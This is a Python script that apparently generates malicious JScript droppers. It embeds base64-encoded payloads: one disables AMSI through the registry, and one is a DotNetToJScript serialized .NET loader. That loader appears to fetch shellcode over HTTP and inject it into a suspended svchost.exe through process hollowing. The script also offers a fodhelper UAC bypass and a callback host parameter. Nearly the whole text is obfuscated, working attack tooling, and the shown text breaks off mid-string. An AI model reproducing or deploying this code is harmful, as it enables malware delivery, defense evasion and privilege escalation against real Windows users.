import os
import base64
import argparse
from makerunner import gen,runner
from makefodhelper import writefodhelper

def copy(runfilename,payfilepath,payfilename):
    os.system("cp %s %s%s" % (runfilename,payfilepath,payfilename))
    print ('[+] %s copied to %s%s' % (runfilename,payfilepath,payfilename))
    pass

def writejs(bitness,pformat,uacbypass,lhost):
    amsi = "dmFyIHNoID0gbmV3IEFjdGl2ZVhPYmplY3QoJ1dTY3JpcHQuU2hlbGwnKTsKdmFyIGtleSA9ICJIS0NVXFxTb2Z0d2FyZVxcTWljcm9zb2Z0XFxXaW5kb3dzIFNjcmlwdFxcU2V0dGluZ3NcXEFtIisic2kiKyJFbmFibGUiOwoKdHJ5ewogICAgdmFyIFNpYW1FbmFibGUgPSBzaC5SZWdSZWFkKGtleSk7CiAgICBpZihTaWFtRW5hYmxlIT0wKXsKICAgIHRocm93IG5ldyBFcnJvcigxLCAnJyk7CiAgICB9Cn1jYXRjaChlKXsKICAgIHNoLlJlZ1dyaXRlKGtleSwgMCwgIlJFR19EV09SRCIpOyAvLyBuZXV0ZXIgU0lBTQogICAgc2guUnVuKCJjc2NyaXB0IC1lOntGNDE0QzI2Mi02QUMwLTExQ0YtQjZEMS0wMEFBMDBCQkJCNTh9ICIrV1NjcmlwdC5TY3JpcHRGdWxsTmFtZSwwLDEpOyAvLyBibG9ja2luZyBjYWxsIHRvIFJ1bigpCiAgICBzaC5SZWdXcml0ZShrZXksIDEsICJSRUdfRFdPUkQiKTsgLy8gcHV0IGl0IGJhY2sKICAgIFdTY3JpcHQuUXVpdCgxKTsKfQ=="

    if uacbypass == "0":
        upper = "ZnVuY3Rpb24gc2V0dmVyc2lvbigpIHsKICAgIG5ldyBBY3RpdmVYT2JqZWN0KCdXU2NyaXB0LlNoZWxsJykuRW52aXJvbm1lbnQoJ1Byb2Nlc3MnKSgnQ09NUExVU19WZXJzaW9uJykgPSAndjQuMC4zMDMxOSc7Cn0KCmZ1bmN0aW9uIGRlYnVnKHMpIHt9CgpmdW5jdGlvbiBiYXNlNjRUb1N0cmVhbShiKSB7CiAgICB2YXIgZW5jID0gbmV3IEFjdGl2ZVhPYmplY3QoIlN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmciKTsKICAgIHZhciBsZW5ndGggPSBlbmMuR2V0Qnl0ZUNvdW50XzIoYik7CiAgICB2YXIgYmEgPSBlbmMuR2V0Qnl0ZXNfNChiKTsKICAgIHZhciB0cmFuc2Zvcm0gPSBuZXcgQWN0aXZlWE9iamVjdCgiU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5Gcm9tQmFzZTY0VHJhbnNmb3JtIik7CiAgICBiYSA9IHRyYW5zZm9ybS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGJhLCAwLCBsZW5ndGgpOwogICAgdmFyIG1zID0gbmV3IEFjdGl2ZVhPYmplY3QoIlN5c3RlbS5JTy5NZW1vcnlTdHJlYW0iKTsKICAgIG1zLldyaXRlKGJhLCAwLCAobGVuZ3RoIC8gNCkgKiAzKTsKICAgIG1zLlBvc2l0aW9uID0gMDsKICAgIHJldHVybiBtczsKfQoKdmFyIHNlcmlhbGl6ZWRfb2JqID0gIkFBRUFBQUQvLy8vL0FRQUFBQUFBQUFBRUFRQUFBQ0pUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnkiKwoiQXdBQUFBaEVaV3hsWjJGMFpRZDBZWEpuWlhRd0IyMWxkR2h2WkRBREF3TXdVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaCIrCiJkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1ZEhKNUlsTjVjM1JsYlM1RVpXeGxaMkYwWlZObGNtbGhiR2w2WVhScGIyNUliMnhrIisKIlpYSXZVM2x6ZEdWdExsSmxabXhsWTNScGIyNHVUV1Z0WW1WeVNXNW1iMU5sY21saGJHbDZZWFJwYjI1SWIyeGtaWElKQWdBQUFBa0QiKwoiQUFBQUNRUUFBQUFFQWdBQUFEQlRlWE4wWlcwdVJHVnNaV2RoZEdWVFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeUswUmxiR1ZuWVhSbCIrCiJSVzUwY25rSEFBQUFCSFI1Y0dVSVlYTnpaVzFpYkhrR2RHRnlaMlYwRW5SaGNtZGxkRlI1Y0dWQmMzTmxiV0pzZVE1MFlYSm5aWFJVIisKImVYQmxUbUZ0WlFwdFpYUm9iMlJPWVcxbERXUmxiR1ZuWVhSbFJXNTBjbmtCQVFJQkFRRURNRk41YzNSbGJTNUVaV3hsWjJGMFpWTmwiKwoiY21saGJHbDZZWFJwYjI1SWIyeGtaWElyUkdWc1pXZGhkR1ZGYm5SeWVRWUZBQUFBTDFONWMzUmxiUzVTZFc1MGFXMWxMbEpsYlc5MCIrCiJhVzVuTGsxbGMzTmhaMmx1Wnk1SVpXRmtaWEpJWVc1a2JHVnlCZ1lBQUFCTGJYTmpiM0pzYVdJc0lGWmxjbk5wYjI0OU1pNHdMakF1IisKIk1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1QmdjQUFBQUgiKwoiZEdGeVoyVjBNQWtHQUFBQUJna0FBQUFQVTNsemRHVnRMa1JsYkdWbllYUmxCZ29BQUFBTlJIbHVZVzFwWTBsdWRtOXJaUW9FQXdBQSIrCiJBQ0pUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlBd0FBQUFoRVpXeGxaMkYwWlFkMFlYSm5aWFF3IisKIkIyMWxkR2h2WkRBREJ3TXdVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNpdEVaV3hsWjJGMFpVVnUiKwoiZEhKNUFpOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjZ2tMQUFBQSIrCiJDUXdBQUFBSkRRQUFBQVFFQUFBQUwxTjVjM1JsYlM1U1pXWnNaV04wYVc5dUxrMWxiV0psY2tsdVptOVRaWEpwWVd4cGVtRjBhVzl1IisKIlNHOXNaR1Z5QmdBQUFBUk9ZVzFsREVGemMyVnRZbXg1VG1GdFpRbERiR0Z6YzA1aGJXVUpVMmxuYm1GMGRYSmxDazFsYldKbGNsUjUiKwoiY0dVUVIyVnVaWEpwWTBGeVozVnRaVzUwY3dFQkFRRUFBd2dOVTNsemRHVnRMbFI1Y0dWYlhRa0tBQUFBQ1FZQUFBQUpDUUFBQUFZUiIrCiJBQUFBTEZONWMzUmxiUzVQWW1wbFkzUWdSSGx1WVcxcFkwbHVkbTlyWlNoVGVYTjBaVzB1VDJKcVpXTjBXMTBwQ0FBQUFBb0JDd0FBIisKIkFBSUFBQUFHRWdBQUFDQlRlWE4wWlcwdVdHMXNMbE5qYUdWdFlTNVliV3hXWVd4MVpVZGxkSFJsY2dZVEFBQUFUVk41YzNSbGJTNVkiKwoiYld3c0lGWmxjbk5wYjI0OU1pNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaCIrCiJOV00xTmpFNU16UmxNRGc1QmhRQUFBQUhkR0Z5WjJWME1Ba0dBQUFBQmhZQUFBQWFVM2x6ZEdWdExsSmxabXhsWTNScGIyNHVRWE56IisKIlpXMWliSGtHRndBQUFBUk1iMkZrQ2c4TUFBQUFBQ0lBQUFKTldwQUFBd0FBQUFRQUFBRC8vd0FBdUFBQUFBQUFBQUJBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDQUFBQUFEaCs2RGdDMENjMGh1QUZNelNGVWFHbHpJSEJ5YjJkeSIrCiJZVzBnWTJGdWJtOTBJR0psSUhKMWJpQnBiaUJFVDFNZ2JXOWtaUzRORFFva0FBQUFBQUFBQUZCRkFBQmtoZ0lBRnVsZ1lRQUFBQUFBIisKIkFBQUE4QUFpSUFzQ01BQUFHZ0FBQUFZQUFBQUFBQUFBQUFBQUFDQUFBQUFBQUlBQkFBQUFBQ0FBQUFBQ0FBQUVBQUFBQUFBQUFBUUEiKwoiQUFBQUFBQUFBR0FBQUFBQ0FBQUFBQUFBQXdCQWhRQUFRQUFBQUFBQUFFQUFBQUFBQUFBQUFCQUFBQUFBQUFBZ0FBQUFBQUFBQUFBQSIrCiJBQkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUVBQUFBd0VBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVFPQUFBIisKIkhBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFDQUFBRWdBQUFBQUFBQUFBQUFBQUM1MFpYaDBBQUFBVUJrQUFBQWdBQUFBR2dBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUNBQSIrCiJBR0F1Y25OeVl3QUFBQXdFQUFBQVFBQUFBQVlBQUFBY0FBQUFBQUFBQUFBQUFBQUFBQUJBQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUVnQUFBQUNBQVVBekNNQUFFUVVBQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCNENLQThBQUFvcUd6QUNBSjhBQUFBQiIrCiJBQUFSS0JBQUFBb0tJQkFuQUFBb0FRQUFCaWdRQUFBS0V3UVNCQVlvRVFBQUNoTUZFZ1VvRWdBQUNpTUFBQUFBQUFBalFEUUJLbklCIisKIkFBQndDd2NvRXdBQUNuUVdBQUFCYnhRQUFBcDBFZ0FBQVJNR0VRWnZGUUFBQ2lESUFBQUFNd0xlUFJFR2J4WUFBQXJlRFNaeU1RQUEiKwoiY0NnWEFBQUszZ0FXRENBQTZhUTFEUllUQnlzS0NCZFlEQkVIRjFnVEJ4RUhDVEx4Q0FrdUFTb0RLQTBBQUFZcUFBRVFBQUFBQURvQSIrCiJNR29BRFE4QUFBRXljd29BQUFZRGJ3c0FBQVlxQUFBQUV6QUtBSmdDQUFBQ0FBQVJja01BQUhCeVZRQUFjQW9vQ0FBQUJnWW9DUUFBIisKIkJnc1dEQm1OR2dBQUFTWFFBd0FBQkNnWUFBQUtEUWNaSDBBU0FpZ0hBQUFHSmdrV0J3bU9hU2daQUFBS0J4a2ZJQklDS0FjQUFBWW0iKwoiQWlnYUFBQUtFd1FTQmY0VkJRQUFBaElHL2hVRUFBQUNGSEp6QUFCd2Zoc0FBQXArR3dBQUNoWWFmaHNBQUFvVUVnVVNCaWdDQUFBRyIrCiJFd2R5c3dBQWNCRUdld1lBQUFTTUlRQUFBUkVIakNJQUFBRW9IQUFBQ2lnWEFBQUtFZ2orRlFZQUFBSVdFd2tSQm5zRUFBQUVGaElJIisKIktCMEFBQW9jV2hJSktBTUFBQVpxRXdvUkNIc2JBQUFFS0I0QUFBb2ZFR3BZS0I4QUFBb1RDM0pDQVFCd2N1VUJBSEFTQzNMckFRQnciKwoiS0NBQUFBb29JUUFBQ2hFS0ZtcitBWXdpQUFBQktCd0FBQW9vRndBQUNoNk5HZ0FBQVJNTUlBQUNBQUNOR2dBQUFSTU5FZzcrRlNBQSIrCiJBQUVSQm5zRUFBQUVFUXNSREJFTWpta1NEaWdFQUFBR0V3OFJEQllvSWdBQUNpZ2ZBQUFLRXhBUkJuc0VBQUFFRVJBUkRSRU5qbWtTIisKIkRpZ0VBQUFHRXc5eTd3RUFjQklRY3VzQkFIQW9JQUFBQ25JMUFnQndLQ01BQUFvb0Z3QUFDaEVOSHp3b0pBQUFDaE1SY2prQ0FIQVMiKwoiRVhMckFRQndLQ1VBQUFweU5RSUFjQ2dqQUFBS0tCY0FBQW9SRVI4b1dCTVNjbThDQUhBU0VuTHJBUUJ3S0NVQUFBcHlOUUlBY0NnaiIrCiJBQUFLS0JjQUFBb1JEUkVTS0NRQUFBb1RFM0tiQWdCd0VoTnk2d0VBY0NnbEFBQUtjalVDQUhBb0l3QUFDaWdYQUFBS0VSQW9IZ0FBIisKIkNoRVRibGdvSHdBQUNoTVVjc1VDQUhBU0ZITHJBUUJ3S0NBQUFBcHlOUUlBY0NnakFBQUtLQmNBQUFvUkJuc0VBQUFFRVJRUkJCRUUiKwoiam1rU0RpZ0ZBQUFHRXc5eUVRTUFjQkVQakNJQUFBRW9KZ0FBQ2lnWEFBQUtFUVo3QlFBQUJDZ0dBQUFHRXhWeWN3TUFjQkVWRi80QiIrCiJqQ0lBQUFFb0pnQUFDaWdYQUFBS0tpSURLQ2NBQUFvbUtnQUFBRUpUU2tJQkFBRUFBQUFBQUF3QUFBQjJNaTR3TGpVd056STNBQUFBIisKIkFBVUFiQUFBQUJBR0FBQWpmZ0FBZkFZQUFNUUhBQUFqVTNSeWFXNW5jd0FBQUFCQURnQUE0QU1BQUNOVlV3QWdFZ0FBRUFBQUFDTkgiKwoiVlVsRUFBQUFNQklBQUJRQ0FBQWpRbXh2WWdBQUFBQUFBQUFDQUFBQlY1MENOQWtDQUFBQStnRXpBQllBQUFFQUFBQW1BQUFBQndBQSIrCiJBQjhBQUFBT0FBQUFKZ0FBQUNjQUFBQUNBQUFBRHdBQUFBRUFBQUFDQUFBQUF3QUFBQWtBQUFBQkFBQUFBUUFBQUFJQUFBQUVBQUFBIisKIkFBQVhCQUVBQUFBQUFBWUFHQU52QlFZQWhRTnZCUVlBVlFJZEJROEFqd1VBQUFZQWZRS1NCQVlBK3dLU0JBWUEzQUtTQkFZQWJBT1MiKwoiQkFZQU9BT1NCQVlBVVFPU0JBWUFsQUtTQkFZQWFRSlFCUVlBUndKUUJRWUF2d0tTQkFZQXZBWXJCQVlBMkFFckJBWUFPZ1FyQkFvQSIrCiJBd0x1QmdZQStRRXJCQVlBTEFKdkJRb0FKUWZ1QmdvQUlRZnVCZ29BQndMdUJnb0FkQUh1QmdZQW9BRXJCQVlBb3dNckJBWUFDUVp2IisKIkJRWUFZd2NyQkFZQWpRRXJCQVlBK0FOUUJRWUFHUWNyQkFZQUZnVXJCQVlBRndBckJBWUFNZ1FyQkFZQTRRTXJCQVlBK1FRckJBWUEiKwoiRmdBckJBb0Fhd1lkQlFBQUFBQ2tBQUFBQUFBQkFBRUFBUUFRQUMwR0FBQTlBQUVBQVFBQUFRQUFyUUFBQUQwQUF3QVBBQW9CRWdERCIrCiJCQUFBVFFBRUFBOEFDZ0VTQUxjRUFBQk5BQWdBRHdBTkFSQUFwQVFBQUUwQUdnQVBBQk1CQUFBMUFBQUFUUUFnQUE4QVZvRE1BTjBBIisKIlZvRGRBT0FBTXdGakFPTUFCZ0JGQm9VQUJnQTdBWVVBQmdBa0FlQUFCZ0FiQWVBQUJnQVBBZDBBQmdCUUFlY0FCZ0RmQk9jQUJnQ28iKwoiQWVjQUJnQUhBZDBBQmdBTEFkMEFCZ0NvQTkwQUJnQ3dBOTBBQmdEdEJkMEFCZ0Q3QmQwQUJnQ3ZBdDBBQmdEbEJkMEFCZ0JOQitvQSIrCiJCZ0FkQU9vQUJnQXBBSVVBQmdBd0I0VUFCZ0E2QjRVQUJnQUdCWVVBQmdBQkFJVUFCZ0J6Qm9VQUJnQXJBSVVBQmdCUkFJVUFCZ0JiIisKIkFZVUFCZ0JEQVlVQUFBQUFBSUFBa1NEWkJPMEFBUUFBQUFBQWdBQ1JJRGNHOGdBQ0FBQUFBQUNBQUpFZ1RnWUVBUXdBQUFBQUFJQUEiKwoia1NDS0J4QUJFUUFBQUFBQWdBQ1dJSndIRUFFV0FBQUFBQUNBQUpFZ0xnRWJBUnNBQUFBQUFJQUFsaURTQmlBQkhBQUFBQUFBZ0FDVyIrCiJJSDRIS1FFZ0FBQUFBQUNBQUpZZ2ZnWXVBU0VBU0NBQUFBQUFoaGdRQlFZQUl3QlFJQUFBQUFDR0FPMERFQUFqQUF3aEFBQUFBSVlBIisKInp3UVFBQ1FBSENFQUFBQUFrUUR5QkVrQUpRREFJd0FBQUFDR0FHZ0dFQUFtQUFBQUFRQkJCUUFBQVFEQkFRQUFBZ0RoQVFBQUF3REIiKwoiQlFBQUJBQ3VCUUFBQlFDZUJRQUFCZ0RWQlFBQUJ3QUZCd0FBQ0FDdkJ3RUFDUUMxQkFJQUNnQjlCQUFBQVFCRkJnQUFBZ0FZQmdBQSIrCiJBd0J0QkFBQUJBQkRCQUFBQlFCUEJBQUFBUUJGQmdBQUFnQ05CZ0lBQXdEcEJBQUFCQURIQXdJQUJRRDFBQUFBQVFCRkJnQUFBZ0NOIisKIkJnQUFBd0RwQkFBQUJBREJBd0lBQlFCV0JBQUFBUUE3QVFBQUFRQ2JCZ0FBQWdESEF3QUFBd0RoQmdJQUJBRERCZ0FBQVFEVEFRQUEiKwoiQVFDd0FRQUFBZ0M0QVFBQUFRQ0RBUUFBQVFDREFRQUFBUUNEQVFBQUFRRG9Bd2tBRUFVQkFCRUFFQVVHQUJrQUVBVUtBQ2tBRUFVUSIrCiJBREVBRUFVUUFEa0FFQVVRQUVFQUVBVVFBRWtBRUFVUUFGRUFFQVVRQUZrQUVBVVFBR0VBRUFVVkFHa0FFQVVRQUhFQUVBVVFBS0VBIisKIkVBVUdBSGtBRUFVR0FJRUFSUWNwQUlFQXN3WXVBSWtBTUFVMUFLa0FKUUk1QUtrQUV3SS9BSkVBWlFGRUFMa0FId0lHQU1rQTd3RkoiKwoiQU5rQVdRZHVBUEVBZVFkMkFQa0F6Z04vQUFFQjFBU0ZBQmtCckFhSUFBRUJ1QU9QQUFFQitRYVRBQUVCK1FhWUFBRUIzd09kQUJrQiIrCiJwUWFpQUNFQld3Q29BQmtCcFFhdkFDRUJGQUMyQUNrQjN3T2RBQmtCckFhOUFERUJFd2ZEQUFrQUJBRFRBQWdBQ0FEWUFDNEFDd0EwIisKIkFTNEFFd0E5QVM0QUd3QmNBUzRBSXdCbEFTNEFLd0I2QVM0QU13Q2tBUzRBT3dDa0FTNEFRd0JsQVM0QVN3Q3FBUzRBVXdDa0FTNEEiKwoiV3dDa0FTNEFZd0RQQVM0QWF3RDVBVU1BV3dBR0FtTUFjd0FNQWdFQUF3QUFBQWNBR2dCT0FBQUVEUVFMQUFBQkF3RFpCQUVBUWdFRiIrCiJBRGNHQVFBQUF3Y0FUZ1lDQUVBQkNRQ0tCd0VBUUFFTEFKd0hBUUJBQVEwQUxnRUJBQUFCRHdEU0JnTUFBQUVSQUg0SEF3QUFBUk1BIisKImZnWURBRWc1QUFBREFBU0FBQUFCQUFBQUFBQUFBQUFBQUFBQUFHa0hBQUFDQUFBQUFBQUFBQUFBQUFES0FCSUJBQUFBQUFJQUFBQUEiKwoiQUFBQUFBQUFBTW9BS3dRQUFBQUFCQUFDQUFVQUFnQUdBQUlBQndBREFBQUFBQUFBVW1WelpYSjJaV1F4QUd0bGNtNWxiRE15QUZSdiIrCiJWVWx1ZERNeUFHTmlVbVZ6WlhKMlpXUXlBR3h3VW1WelpYSjJaV1F5QUY5ZlUzUmhkR2xqUVhKeVlYbEpibWwwVkhsd1pWTnBlbVU5IisKIk13QlNaWE5sY25abFpETUFWRzlKYm5RMk5BQkVNek0wT1RJNFJUbEVOREUyTWpsQ05rUTNRMEU0UTBSQ1JqWTBRakU0UkRjNVJFWkUiKwoiTkVVek5qazRNRVJETUVOQk1EUTVOVE0xTVRnMk5EUTNSakUzQUR4TmIyUjFiR1UrQUR4UWNtbDJZWFJsU1cxd2JHVnRaVzUwWVhScCIrCiJiMjVFWlhSaGFXeHpQZ0JEVWtWQlZFVmZVMVZUVUVWT1JFVkVBRkJTVDBORlUxTkNRVk5KUTBsT1JrOVNUVUZVU1U5T0FHeHdUblZ0IisKIlltVnlUMlppZVhSbGMxSlhBR1IzV0FCa2Qxa0FZMklBYlhOamIzSnNhV0lBVkdoeVpXRmtTV1FBVUhKdlkyVnpjMGxrQUZKbGMzVnQiKwoiWlZSb2NtVmhaQUJvVkdoeVpXRmtBRTF2Y21WU1pYTmxjblpsWkFCc2NGSmxjMlZ5ZG1Wa0FGVnVhWEYxWlZCcFpBQm5aWFJmVTNSaCIrCiJkSFZ6UTI5a1pRQklkSFJ3VTNSaGRIVnpRMjlrWlFCemFHVnNiR052WkdVQVVuVnVkR2x0WlVacFpXeGtTR0Z1Wkd4bEFFTnZibk52IisKImJHVUFiSEJVYVhSc1pRQm9UVzlrZFd4bEFIQnliMk5PWVcxbEFHeHdRWEJ3YkdsallYUnBiMjVPWVcxbEFHNWhiV1VBUkdGMFpWUnAiKwoiYldVQWJIQkRiMjF0WVc1a1RHbHVaUUJYY21sMFpVeHBibVVBVm1Gc2RXVlVlWEJsQUVoMGRIQlhaV0pTWlhOd2IyNXpaUUJIWlhSUyIrCiJaWE53YjI1elpRQkRiRzl6WlFCRGNtVmhkR1VBUTI5dGNHbHNaWEpIWlc1bGNtRjBaV1JCZEhSeWFXSjFkR1VBUjNWcFpFRjBkSEpwIisKIlluVjBaUUJFWldKMVoyZGhZbXhsUVhSMGNtbGlkWFJsQUVOdmJWWnBjMmxpYkdWQmRIUnlhV0oxZEdVQVFYTnpaVzFpYkhsVWFYUnMiKwoiWlVGMGRISnBZblYwWlFCQmMzTmxiV0pzZVZSeVlXUmxiV0Z5YTBGMGRISnBZblYwWlFCa2QwWnBiR3hCZEhSeWFXSjFkR1VBUVhOeiIrCiJaVzFpYkhsR2FXeGxWbVZ5YzJsdmJrRjBkSEpwWW5WMFpRQkJjM05sYldKc2VVTnZibVpwWjNWeVlYUnBiMjVCZEhSeWFXSjFkR1VBIisKIlFYTnpaVzFpYkhsRVpYTmpjbWx3ZEdsdmJrRjBkSEpwWW5WMFpRQkRiMjF3YVd4aGRHbHZibEpsYkdGNFlYUnBiMjV6UVhSMGNtbGkiKwoiZFhSbEFFRnpjMlZ0WW14NVVISnZaSFZqZEVGMGRISnBZblYwWlFCQmMzTmxiV0pzZVVOdmNIbHlhV2RvZEVGMGRISnBZblYwWlFCQiIrCiJjM05sYldKc2VVTnZiWEJoYm5sQmRIUnlhV0oxZEdVQVVuVnVkR2x0WlVOdmJYQmhkR2xpYVd4cGRIbEJkSFJ5YVdKMWRHVUFRbmwwIisKIlpRQmtkMWhUYVhwbEFHUjNXVk5wZW1VQVoyVjBYMU5wZW1VQWJsTnBlbVVBWkhkVGFYcGxBRVp5YjIxQ1lYTmxOalJUZEhKcGJtY0EiKwoiVkc5VGRISnBibWNBY0dGMGFBQkRhR1ZqYTBOb1pXTnJBRTFoY25Ob1lXd0FhMlZ5Ym1Wc016SXVaR3hzQUc1MFpHeHNMbVJzYkFCRiIrCiJlR0Z0Y0d4bFFYTnpaVzFpYkhrdVpHeHNBRk41YzNSbGJRQkNiMjlzWldGdUFGUnBiV1ZUY0dGdUFGQnliMk5KYm1adlRHVnVBSEpsIisKImRHeGxiZ0JzY0U1MWJXSmxjazltUW5sMFpYTlhjbWwwZEdWdUFIQnliMk5KYm1admNtMWhkR2x2YmdCc2NGQnliMk5sYzNOSmJtWnYiKwoiY20xaGRHbHZiZ0JUZVhOMFpXMHVVbVZtYkdWamRHbHZiZ0JRY205alpYTnpRbUZ6YVdOSmJtWnZBR3h3VTNSaGNuUjFjRWx1Wm04QSIrCiJVSEp2WTJWemMwbHVabThBWjI5bmJ3QmFaWEp2QUZOc1pXVndBR3h3UkdWemEzUnZjQUJzY0VKMVptWmxjZ0J5ZFc1dVpYSUFRbWwwIisKIlEyOXVkbVZ5ZEdWeUFHaFRkR1JGY25KdmNnQXVZM1J2Y2dCSmJuUlFkSElBVTNsemRHVnRMa1JwWVdkdWIzTjBhV056QUdkbGRGOVUiKwoiYjNSaGJGTmxZMjl1WkhNQVpIZE5hV3hzYVhObFkyOXVaSE1BVTNsemRHVnRMbEoxYm5ScGJXVXVTVzUwWlhKdmNGTmxjblpwWTJWeiIrCiJBRk41YzNSbGJTNVNkVzUwYVcxbExrTnZiWEJwYkdWeVUyVnlkbWxqWlhNQVJHVmlkV2RuYVc1blRXOWtaWE1BWWtsdWFHVnlhWFJJIisKIllXNWtiR1Z6QUd4d1ZHaHlaV0ZrUVhSMGNtbGlkWFJsY3dCc2NGQnliMk5sYzNOQmRIUnlhV0oxZEdWekFHUjNRM0psWVhScGIyNUciKwoiYkdGbmN3QmtkMFpzWVdkekFHUjNXRU52ZFc1MFEyaGhjbk1BWkhkWlEyOTFiblJEYUdGeWN3QlNkVzUwYVcxbFNHVnNjR1Z5Y3dCdyIrCiJjbTlqU1c1bWIzSnRZWFJwYjI1RGJHRnpjd0JVWlhOMFEyeGhjM01BUTNKbFlYUmxVSEp2WTJWemN3Qm9VSEp2WTJWemN3QmFkMUYxIisKIlpYSjVTVzVtYjNKdFlYUnBiMjVRY205alpYTnpBRkoxYmxCeWIyTmxjM01BVUdWaVFXUmtjbVZ6Y3dCSFpYUlFjbTlqUVdSa2NtVnoiKwoiY3dCc2NFSmhjMlZCWkdSeVpYTnpBR3h3UVdSa2NtVnpjd0JEYjI1allYUUFSbTl5YldGMEFGTjFZblJ5WVdOMEFFOWlhbVZqZEFCcyIrCiJjR1pzVDJ4a1VISnZkR1ZqZEFCV2FYSjBkV0ZzVUhKdmRHVmpkQUJtYkU1bGQxQnliM1JsWTNRQVUzbHpkR1Z0TGs1bGRBQnZjRjlGIisKImVIQnNhV05wZEFCc2NFVnVkbWx5YjI1dFpXNTBBRk4wWVhKMEFFTnZiblpsY25RQVNIUjBjRmRsWWxKbGNYVmxjM1FBYUZOMFpFbHUiKwoiY0hWMEFHaFRkR1JQZFhSd2RYUUFaMlYwWDA1dmR3QjNVMmh2ZDFkcGJtUnZkd0JKYm1sMGFXRnNhWHBsUVhKeVlYa0FSWGhoYlhCcyIrCiJaVUZ6YzJWdFlteDVBRU52Y0hrQVRHOWhaRXhwWW5KaGNua0FVbVZoWkZCeWIyTmxjM05OWlcxdmNua0FWM0pwZEdWUWNtOWpaWE56IisKIlRXVnRiM0o1QUd4d1EzVnljbVZ1ZEVScGNtVmpkRzl5ZVFBQUFBQXZhQUIwQUhRQWNBQTZBQzhBTHdCM0FHOEFiQUIwQUhJQVlRQnQiKwoiQUdFQWNBQnNBR2dBWVFBdUFHTUFid0J0QUFBUll3QnZBRzRBWndCeUFHRUFkQUJ6QUFBUllRQnRBSE1BYVFBdUFHUUFiQUJzQUFBZCIrCiJRUUJ0QUhNQWFRQlRBR01BWVFCdUFFSUFkUUJtQUdZQVpRQnlBQUEvWXdBNkFGd0Fkd0JwQUc0QVpBQnZBSGNBY3dCY0FITUFlUUJ6IisKIkFIUUFaUUJ0QURNQU1nQmNBSE1BZGdCakFHZ0Fid0J6QUhRQUxnQmxBSGdBWlFBQWdJMVRBSFFBWVFCeUFIUUFaUUJrQUNBQUp3QnoiKwoiQUhZQVl3Qm9BRzhBY3dCMEFDNEFaUUI0QUdVQUp3QWdBR2tBYmdBZ0FHRUFJQUJ6QUhVQWN3QndBR1VBYmdCa0FHVUFaQUFnQUhNQSIrCiJkQUJoQUhRQVpRQWdBSGNBYVFCMEFHZ0FJQUJRQUVrQVJBQWdBSHNBTUFCOUFDNEFJQUJUQUhVQVl3QmpBR1VBY3dCekFEb0FJQUI3IisKIkFERUFmUUF1QUFHQW9VY0Fid0IwQUNBQWNBQnlBRzhBWXdCbEFITUFjd0FnQUdrQWJnQm1BRzhBY2dCdEFHRUFkQUJwQUc4QWJnQWciKwoiQUdFQWJnQmtBQ0FBYkFCdkFHTUFZUUIwQUdVQVpBQWdBRkFBUlFCQ0FDQUFZUUJrQUdRQWNnQmxBSE1BY3dBZ0FHOEFaZ0FnQUhBQSIrCiJjZ0J2QUdNQVpRQnpBSE1BSUFCaEFIUUFJQUI3QURBQWZRQXVBQ0FBVXdCMUFHTUFZd0JsQUhNQWN3QTZBQ0FBZXdBeEFIMEFMZ0FBIisKIkJUQUFlQUFBQTNnQUFFVkVBRVVBUWdCVkFFY0FPZ0FnQUVVQWVBQmxBR01BZFFCMEFHRUFZZ0JzQUdVQUlBQmlBR0VBY3dCbEFDQUEiKwoiWVFCa0FHUUFjZ0JsQUhNQWN3QTZBQ0FBTUFCNEFBQURMZ0FBTlVRQVJRQkNBRlVBUndBNkFDQUFaUUJmQUd3QVpnQmhBRzRBWlFCMyIrCiJBQ0FBYndCbUFHWUFjd0JsQUhRQU9nQWdBREFBZUFBQUswUUFSUUJDQUZVQVJ3QTZBQ0FBVWdCV0FFRUFJQUJ2QUdZQVpnQnpBR1VBIisKImRBQTZBQ0FBTUFCNEFBQXBSQUJGQUVJQVZRQkhBRG9BSUFCU0FGWUFRUUFnQUhZQVlRQnNBSFVBWlFBNkFDQUFNQUI0QUFCTFJ3QnYiKwoiQUhRQUlBQmxBSGdBWlFCakFIVUFkQUJoQUdJQWJBQmxBQ0FBWlFCdUFIUUFjZ0I1QUhBQWJ3QnBBRzRBZEFBZ0FHRUFaQUJrQUhJQSIrCiJaUUJ6QUhNQU9nQWdBREFBZUFBQVlVOEFkZ0JsQUhJQWR3QnlBRzhBZEFCbEFDQUFaUUJ1QUhRQWNnQjVBSEFBYndCcEFHNEFkQUFnIisKIkFIY0FhUUIwQUdnQUlBQndBR0VBZVFCc0FHOEFZUUJrQUM0QUlBQlRBSFVBWXdCakFHVUFjd0J6QURvQUlB